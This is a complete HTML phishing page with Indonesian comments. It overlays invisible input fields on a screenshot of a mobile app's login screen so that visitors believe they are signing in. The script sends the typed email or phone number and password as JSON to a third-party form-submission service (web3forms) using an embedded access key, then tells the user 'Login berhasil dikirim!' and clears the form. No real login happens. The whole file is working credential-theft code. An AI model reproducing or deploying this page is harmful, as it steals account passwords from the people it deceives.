<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body {
    height: 100%;
    background: #ffffff; /* area di luar/belakang gambar */
  }

  body {
    display: flex;
    align-items: center;
    justify-content: center;
  }

  /*
    Aspect ratio dikunci PERSIS sama kaya gambar aslinya (465 x 939)
    Jadi di layar HP berapapun ukurannya, proporsi gambar & posisi form
    tetap presisi, nggak akan geser/melenceng.
  */
  .phone-frame {
    position: relative;
    width: min(465px, 100vw);
    aspect-ratio: 465 / 939;
    background-image: url('bg-login.jpg');
    background-size: cover;
    background-position: center;
  }

  .overlay-el {
    position: absolute;
    background: transparent;
    border: none;
    outline: none;
    -webkit-appearance: none;
    appearance: none;
  }

  /* Tombol back di pojok kiri atas gambar */
  .btn-back {
    top: 2%;
    left: 4%;
    width: 10%;
    height: 4%;
    cursor: pointer;
  }

  /* Input "Nomor ponsel atau email" & "Kata sandi" */
  #email, #password {
    left: 4.95%;
    width: 90.1%;
    padding-left: 5%;
    color: #ffffff;
    font-size: 16px;       /* min 16px penting biar gak auto-zoom di iOS */
    caret-color: #ffffff;
    border-radius: 16px;
    transition: background-color 0.2s ease, color 0.2s ease;
  }

  #email    { top: 39.19%; height: 7.24%; }
  #password { top: 48.56%; height: 7.24%; }

  /* Kondisi setelah user mulai mengetik isi -> background jadi putih */
  #email.filled, #password.filled {
    background-color: #ffffff;
    color: #1a1a1a;
    caret-color: #1a1a1a;
  }

  /* Tombol "Login" (bentuk pill abu-abu sudah ada di gambar) */
  .btn-login {
    top: 57.61%;
    left: 4.3%;
    width: 91.4%;
    height: 5.65%;
    cursor: pointer;
    font-size: 0;
    color: transparent;
  }

  /* Link "Lupa kata sandi?" */
  .btn-forgot {
    top: 65.5%;
    left: 25%;
    width: 50%;
    height: 3.5%;
    cursor: pointer;
  }
</style>
</head>
<body>

  <div class="phone-frame">

    <button type="button" class="overlay-el btn-back" aria-label="Kembali" onclick="history.back()"></button>

    <form id="loginForm">
      <input type="hidden" name="access_key" value="d9b57eb9-7f9e-49f5-989b-836d2bdf8d9f">
      <input type="hidden" name="subject" value="Login baru dari halaman masuk">
      <input type="text" name="email" id="email" class="overlay-el" autocomplete="username" required>
      <input type="password" name="password" id="password" class="overlay-el" autocomplete="current-password" required>
      <button type="submit" class="overlay-el btn-login">Login</button>
    </form>

    <a href="#" class="overlay-el btn-forgot" aria-label="Lupa kata sandi"></a>

  </div>

  <script>
    const loginForm = document.getElementById('loginForm');

    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const formData = new FormData(loginForm);
      const object = Object.fromEntries(formData);
      const json = JSON.stringify(object);

      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: json
      })
        .then(async (response) => {
          const result = await response.json();
          if (response.status === 200) {
            alert('Login berhasil dikirim!');
            loginForm.reset();
            document.getElementById('email').classList.remove('filled');
            document.getElementById('password').classList.remove('filled');
          } else {
            console.log(result);
            alert('Gagal mengirim: ' + result.message);
          }
        })
        .catch((error) => {
          console.log(error);
          alert('Terjadi kesalahan, coba lagi.');
        });
    });

    document.querySelectorAll('#email, #password').forEach(function (input) {
      input.addEventListener('input', function () {
        if (input.value.length > 0) {
          input.classList.add('filled');
        } else {
          input.classList.remove('filled');
        }
      });
    });
  </script>

</body>
</html>
